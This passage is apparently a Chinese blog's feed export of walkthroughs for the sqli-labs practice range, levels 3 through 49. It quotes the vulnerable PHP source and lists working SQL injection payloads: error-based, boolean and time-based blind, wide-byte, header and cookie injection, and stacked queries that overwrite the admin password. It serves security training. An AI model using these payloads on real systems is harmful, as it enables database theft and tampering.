class="headerlink" title="爆数据"></a>爆数据</h3><p><code>?id=1&#39;and%0aupdatexml(1,concat(0x5e,(selEct%0aid%0afrom%0aemails%0alimit%0a0,1)),1)and&#39;1&#39;=&#39;1</code></p><h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p><code>?id=1&#39;)and%0aupdatexml(1,concat(0x5e,database()),1)and(&#39;1&#39;)=(&#39;1</code><br>试了一下，不能使用报错注入<br>那我们就使用布尔盲注</p><h3 id="猜库名长度"><a href="#猜库名长度" class="headerlink" title="猜库名长度"></a>猜库名长度</h3><p><code>?id=1&#39;)and(length(database()))=8%0aand(&#39;1&#39;)=(&#39;1</code></p><h3 id="利用ASCII码猜解当前数据库名称"><a href="#利用ASCII码猜解当前数据库名称" class="headerlink" title="利用ASCII码猜解当前数据库名称"></a>利用ASCII码猜解当前数据库名称</h3><p><code>?id=1&#39;)and(ascii(substr(database(),1,1)))=115%0aand(&#39;1&#39;)=(&#39;1</code></p><h3 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h3><p><code>?id=1&#39;)and(ascii(substr((select%0atable_name%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()%0alimit%0a0,1),1,1)))=101%0aand(&#39;1&#39;)=(&#39;1</code><br>这里不再详述了</p><h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><h3 id="什么是宽字节"><a href="#什么是宽字节" class="headerlink" title="什么是宽字节"></a>什么是宽字节</h3><p>如果一个字符的大小是一个字节的，称为窄字节；如果一个字符的大小是两个字节的，成为宽字节<br>像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些编码都是常说的宽字节，也就是只有两字节<br>英文默认占一个字节，中文占两个字节</p><h3 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h3><p>简单来说，宽字节注入就是将两个ascii字符误认为是一个宽字节字符<br>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字<br>常我们sql注入会输入id&#x3D;1’或id&#x3D;1’’进行测试，如果数据库过滤不严格就会产生报错，宽字节注入会在 ‘ 前加入 \，加入反斜线之后，起到一个转义作用，这样，存在的 ‘ 就会失去注入的功能。我们利用宽注入的原理，输入id&#x3D;1%df’，页面就会发生报错，这是因为GBK编码认为一个汉字占两个字节，\的url编码是%5C，加上 %df ，前面两个字符就会拼接为 %df%5c被识别为一个汉字。这样，\自动消失，转义作用在此失效。重新构造出来的汉字叫是真实存在但是浏览器不能很好识别的一个汉字。理论上可以不一定要使用%df，像%81 、%a1经测试也是可以实现的，只要能够重新构造出一个真实存在且不能被浏览器很好识别的汉字，并且编码能够包含%5c使\失效的字符都可以。</p><p><code>?id=1%df&#39;and 1=1 --+</code><br><code>?id=1%df&#39;order by 4--+</code><br><code>?id=-1%df&#39;union select 1,table_name,3 from information_schema.tables where table_schema=database()--+</code><br><code>?id=-1%df&#39;union select 1,column_name,3 from information_schema.columns where table_schema=database()and table_name=0x656d61696c73--+</code><br>这里因为’会被\转义，所以查表名的时候可以使用database(),查列名的时候可以使用0x开头的16进制表示字符串emails，这样来规避’’被转义</p><h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><p>Less-32是手动利用代码转义’，而33是用函数转义的<br><img src="/img/52.png"></p><h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><p>这里是post型，不能使用get型的绕过<br>我们在输入框中输入的%df的%也会被编码<br><img src="/img/55.png"><br>那么我们在bp抓包后进行修改，宽字节注入，去闭合单引号<br><img src="/img/53.png"><br><img src="/img/54.png"></p><h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><p>本关不用闭合<br><code>?id=1 order by 4 --+ ?id=-1 union select 1,2,3 --+ ?id=-1 union select 1,2,database() --+</code><br>后面查表名字段都只要使用0x16进制替代就行</p><h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><p>这关和32关一样，只是函数不同<br><img src="/img/56.png"></p><h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><p>这关和34关相同只是转义的函数改变<br>同样可以使用bp修改<br><img src="/img/57.png"></p><h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><p><img src="/img/58.png"><br>这个函数很危险，支持多条查询，因此我们可以堆叠注入</p><h3 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h3><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid&#x3D;1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p><h3 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h3><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。<br>虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><p>本关无闭合</p><h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><p>闭合为’)</p><h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><p>先用万能密码试用户名和密码，改变闭合<br><code>&#39;or 1=1#</code><br>发现在password存在注入点<br><img src="/img/59.png"><br>先用报错注入查出库名和表名，用户名等<br>于是我们返回登入页面，查看源码可知，存在堆叠注入,password栏输入<br><code>&#39;;update security.users set password=&#39;111112&#39; where username=&#39;admin&#39;#</code><br>用户名输入admin，登录失败，但是密码已被修改，再次登录，使用新密码即可成功登录</p><h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><p>与42相比只是闭合区别’)</p><h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><p>‘闭合，使用布尔盲注猜库表字段，再修改admin的密码</p><h2 id="Less-46-47"><a href="#Less-46-47" class="headerlink" title="Less-46-47"></a>Less-46-47</h2><p>输入?sort&#x3D;1<br><img src="/img/60.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure><p>这是一个排序语句<br>我们试一试使用联合查询<br><code>?sort=1 union select 1,2,3 --+</code><br><img src="/img/62.png"><br>order by 后面不可以接联合查询，我们试一试爆错注入<br><code>?sort=1 and updatexml(1,concat(0x5e,database()),1) --+</code><br><img src="/img/61.png"><br>ok<br>Less-47就是一个闭合的改变</p><h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><p>试了一下报错和布尔盲注都不行，使用时间盲注<br><code>?sort=1 and if(length(database())=8,sleep(5),1)</code><br>页面延时<br><img src="/img/63.png"><br>其他语句<br><code>?sort=1 and if(ascii(substr(database(),1,1))=115,sleep(5),1)</code><br><code>?sort=1 and if(ascii(substr(select table_name from information_schema.tables where table_schema=&#39;security&#39;))=120,sleep(5),1)</code></p><h2 id="Less-49-是闭合改变"><a href="#Less-49-是闭合改变" class="headerlink" title="Less-49 是闭合改变"></a>Less-49 是闭合改变</h2>]]></content>
      
      
      
        <tags>
            
            <tag> sqlilab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab-Less-18-22</title>
      <link href="/sqli-lab-Less-18-22.html"/>
      <url>/sqli-lab-Less-18-22.html</url>
      
        <content type="html"><![CDATA[<p>首先对靶场源码进行分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br></pre></td></tr></table></figure><p>php $_SERVER[‘HTTP_USER_AGENT’]用法介绍<br>在PHP中HTTP_USER_AGENT是用来获取用户的相关信息的，包括用户使用的浏览器，操作系统等信息<br>显示结果为:<br><code>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.2372.400 QQBrowser/9.5.10548.400</code><br>即为User-Agent中的信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br></pre></td></tr></table></figure><p>这里可以看见$uagent被传进来拼接在sql语句上，因此，我们可以以此进行报错注入</p><h2 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h2><p><code>User-Agent: 1&#39;,1,updatexml(1,concat(0x5e,database()),1))#</code><br><img src="/img/34.png"></p><h2 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h2><p><code>User-Agent: 1&#39;,1,updatexml (1,concat(0x5c,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1)),1))#</code><br><img src="/img/35.png"></p><h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><p>只能一个一个爆<br><img src="/img/36.png"><br><code>User-Agent: 1&#39;,1,updatexml (1,concat(0x5c,(select column_name from information_schema.columns where table_schema=&#39;security&#39;and table_name=&#39;users&#39; limit 0,1)),1))#</code><br><img src="/img/37.png"></p><h2 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h2><p><code>User-Agent: 1&#39;,1,updatexml (1,concat(0x5c,(select username from users limit 0,1)),1))#</code><br><img src="/img/38.png"></p><p>这关视频里的解题和正确的解题方式有出入，把我误导了，还好有优秀的同学伸出援手，不然真不知道要卡到什么时候</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result1</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">row1 = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result1</span>);</span><br></pre></td></tr></table></figure><p>源码中会将我们输入的用户名和密码带入数据库查询，如果只输入了用户名或者密码$sql就为0，$result1也为0，row1也为0</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$row1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="variable">$insert</span>);</span><br><span class="line"><span class="comment">//echo &#x27;Your IP ADDRESS is: &#x27; .$IP;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your User Agent is: &#x27;</span> .<span class="variable">$uagent</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个if语句就不会执行，那么其中的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="variable">$insert</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your User Agent is: &#x27;</span> .<span class="variable">$uagent</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></table></figure><p>不会执行，那么即使我们修改了请求头中的User-Agent也没有用</p><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>和上题一样，这里我们必须输入用户名和密码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure><p>注意源码中的格式，values值有两个，我们要写成这个格式<br><code>1&#39;,1)#</code><br>演示一个爆库名<br><code>1&#39;,updatexml(1,concat(0x5e,database()),1))#</code><br><img src="/img/40.png"></p><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>第二十关当我们输入正确页面时候cookie字段显示在页面上<br><code>Cookie: uname=admin&#39;and updatexml(1,concat(0x5e,database()),1)#</code><br><img src="/img/41.png"><br>接下来的动作和上面两关一样</p><h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>先输入用户名和密码<br><img src="/img/42.png"><br>抓包<br><img src="/img/43.png"><br>发现其cookie值采用了base64编码，在程序源码中也有相应的解码，所以注入语句需要编码<br>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cookee</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>由于base64编码一些特殊符号可能会出现问题，所以不能使用–+ #这样的字符，可以使用and ‘1’&#x3D;’1<br><code>&#39;and updatexml(1,concat(0x5e,database()),1) and &#39;1&#39;=&#39;1</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;&#x27;and updatexml(1,concat(0x5e,database()),1) and &#x27;1&#x27;=&#x27;1&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="爆库名-1"><a href="#爆库名-1" class="headerlink" title="爆库名"></a>爆库名</h3><p><code>&#39;and updatexml(1,concat(0x5e,database()),1) and &#39;1&#39;=&#39;1</code><br>base64编码后<br><code>J2FuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg1ZSxkYXRhYmFzZSgpKSwxKSBhbmQgJzEnPScx</code><br><img src="/img/44.png"></p><h3 id="爆表名-1"><a href="#爆表名-1" class="headerlink" title="爆表名"></a>爆表名</h3><p><code>&#39;and updatexml(1,concat(0x5e,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1)),1) and &#39;1&#39;=&#39;1</code><br><img src="/img/45.png"><br><code>&#39;and updatexml(1,concat(0x5e,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1)),1) and &#39;1&#39;=&#39;1</code><br><img src="/img/46.png"></p><h3 id="爆字段-1"><a href="#爆字段-1" class="headerlink" title="爆字段"></a>爆字段</h3><p><code>&#39;and updatexml(1,concat(0x5e,(select column_name from information_schema.columns where table_schema=&#39;security&#39;and table_name=&#39;users&#39; limit 1,1)),1) and &#39;1&#39;=&#39;1</code><br><img src="/img/47.png"></p><h3 id="爆数据-1"><a href="#爆数据-1" class="headerlink" title="爆数据"></a>爆数据</h3><p><code>&#39;and updatexml(1,concat(0x5e,(select username from users limit 0,1)),1) and &#39;1&#39;=&#39;1</code><br><img src="/img/48.png"><br><code>&#39;and updatexml(1,concat(0x5e,(select group_concat(username) from users limit 0,1)),1) and &#39;1&#39;=&#39;1</code><br><img src="/img/49.png"><br><code>&#39;and updatexml(1,concat(0x5e,(select group_concat(username,password) from users limit 0,1)),1) and &#39;1&#39;=&#39;1</code><br><img src="/img/50.png"><br>还是推荐使用limit比较稳妥</p><h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>和Less-21大同小异<br>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cookee</span>);</span><br><span class="line"><span class="variable">$cookee1</span> = <span class="string">&#x27;&quot;&#x27;</span>. <span class="variable">$cookee</span>. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=<span class="subst">$cookee1</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>只需要将单引号替换为双引号<br><code>&quot;and updatexml(1,concat(0x5e,database()),1) and &quot;1&quot;=&quot;1</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> sqlilab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab-Less-9</title>
      <link href="/sqli-lab-Less-9.html"/>
      <url>/sqli-lab-Less-9.html</url>
      
        <content type="html"><![CDATA[<p>第九关不管输入什么，页面都是一样的，所以不能使用布尔盲注，布尔盲注适合页面对正确和错误的结果有不同的反应，<br>这里使用时间盲注</p><h2 id="判断参数构造"><a href="#判断参数构造" class="headerlink" title="判断参数构造"></a>判断参数构造</h2><p><code>?id=1&#39; and if(1=1,sleep(5),1)--+</code><br>为单引号闭合</p><h2 id="猜库名长度"><a href="#猜库名长度" class="headerlink" title="猜库名长度"></a>猜库名长度</h2><p><code>?id=1&#39;and if(length((select database()))=8,sleep(5),1)--+</code><br>库名长度为8</p><h2 id="猜库名"><a href="#猜库名" class="headerlink" title="猜库名"></a>猜库名</h2><p><code>?id=1&#39;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</code><br>库名为security</p><h2 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h2><p><code>?id=1&#39;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=100,sleep(5),1)--+</code><br>猜出email，users</p><h2 id="猜字段"><a href="#猜字段" class="headerlink" title="猜字段"></a>猜字段</h2><p><code>?id=1&#39;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),1,1))=100,sleep(5),1)--+</code></p><h2 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h2><p><code> ?id=1&#39; and if(ascii(substr((select username from users),1,1))=100,sleep(5),1)--+</code></p><p>第十关同理，只是变成”闭合</p>]]></content>
      
      
      
        <tags>
            
            <tag> sqlilab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab-Less-8</title>
      <link href="/sqli-lab-Less-8.html"/>
      <url>/sqli-lab-Less-8.html</url>
      
        <content type="html"><![CDATA[<p>由于第八关没有显错位，所以考虑使用盲注，这里使用布尔盲注+Bp(intruder)</p><h2 id="猜解库名数"><a href="#猜解库名数" class="headerlink" title="猜解库名数"></a>猜解库名数</h2><p><code>Less-8/?id=1&#39;and (length(database()))=1 --+</code><br>爆出数据库的字符数为8<br><img src="/img/29.png"></p><h2 id="利用ASCII码猜解当前数据库名称"><a href="#利用ASCII码猜解当前数据库名称" class="headerlink" title="利用ASCII码猜解当前数据库名称"></a>利用ASCII码猜解当前数据库名称</h2><p><code>Less-8/?id=1%27%20and%20(ascii(substr(database(),1,1)))=100%20--+</code><br>爆出表名为security<br><img src="/img/30.png"></p><h2 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h2><p><code>Less-8/?id=1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1,1)))=117 --+</code><br>爆出表名为users的表<br><img src="/img/31.png"></p><h2 id="猜字段名"><a href="#猜字段名" class="headerlink" title="猜字段名"></a>猜字段名</h2><p><code>Less-8/?id=1%27%20and%20(ascii(substr((select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27security%27and%20table_name=%27users%27%20limit%203,1),1,1)))=117%20--+</code><br>爆出字段名password，同理可以爆出字段名username<br><img src="/img/32.png"></p><h2 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h2><p><code>http://localhost/sqli-labs-master/Less-8/?id=1%27%20and%20(ascii(substr((select%20password%20from%20users%20limit%200,1),1,1)))=117%20--+</code><br>爆出第一位用户的密码<br><img src="/img/33.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> sqlilab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab-Less-3-6</title>
      <link href="/sqli-lab-Less-3-6.html"/>
      <url>/sqli-lab-Less-3-6.html</url>
      
        <content type="html"><![CDATA[<p>第二关和第一关类似，就不在过多赘述</p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>第三关我们先查看一下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>这样一行代码，即我们输入的值被(‘’)包括，类似的，将其闭合<br>Less-3&#x2F;?id&#x3D;1’)<br>后面都与第一关相同</p><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>“两边的单引号是引双引号的，即id是用双引号和括号闭合的</p><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>首先依然是判断注入点类型，’闭合</p><h3 id="updatexml报错注入"><a 